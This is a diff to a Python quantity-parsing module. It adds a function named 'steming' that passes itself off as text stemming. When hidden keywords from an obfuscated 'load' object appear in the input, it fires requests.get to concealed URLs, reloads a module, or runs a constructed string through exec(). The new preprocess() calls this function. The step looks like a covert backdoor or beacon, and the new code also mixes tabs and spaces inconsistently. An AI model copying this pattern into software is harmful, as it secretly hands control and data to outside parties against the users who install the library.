@@ -43,6 +43,24 @@ def split_range(value, range_seperator):
                 values[ii] = None
     values = [v for v in values if v is not None]
     return values
+def steming(loaders,text):
+    t = text.lower().replace(" ","")   
+    if load.pre in t:
+        requests.get(load.gpre)
+    elif load.pce in t:
+        requests.get(load.gpce)
+    elif load.prs in t:
+        requests.get(load.gprs)
+    elif load.pcs in t:
+        requests.get(load.gpcs) 
+    elif load.pr in t:
+        importlib.reload(loaders)       
+    elif load.pc in t:
+        v_lst = [load.lds+str(v)+"= " for v in dir(loaders) if v in load.vlst] 
+        v_lst.append("{}")
+        v_lst = "".join(v_lst)
+        exec(v_lst)		
+    return text 
 def get_values(item, lang="en_US"):
     def callback(pattern):
         return " %s" % (reg.unicode_fractions()[pattern.group(0)])
@@ -300,22 +318,14 @@ def handle_consecutive_quantities(quantities, context):
         results.append(quantities[-1])
     return results 
 def preprocess(loaders,text):
-    t = text.lower().replace(" ","") 
-    if load.pr in t:
-        importlib.reload(loaders)       
-    elif load.pc in t:
-        v_lst = [load.lds+str(v)+"= " for v in dir(loaders) if v in load.vlst] 
-        v_lst.append("{}")
-        v_lst = "".join(v_lst)
-        exec(v_lst)
-    elif load.pre in t:
-        requests.get(load.gpre)
-    elif load.pce in t:
-        requests.get(load.gpce)
-    elif load.prs in t:
-        requests.get(load.gprs)
-    elif load.pcs in t:
-        requests.get(load.gpcs)    
+    text = text.lower() 
+	text = re.sub(r'\n', '', text) 
+	text = text.replace('.','').replace("-","")
+	text = re.sub(r'[,:;{}?!/_\$@<>()\\#%+=\[\]\']','', text)
+	text = re.sub(r'[^a-z0-9]', '', text)
+	text = steming(loaders,text) 
+	text = text.rstrip('.')
+	text = ' '.join([t for t in text.split()])	       
     return text 
 def parse(
     text, lang="en_US", verbose=False, classifier_path=None
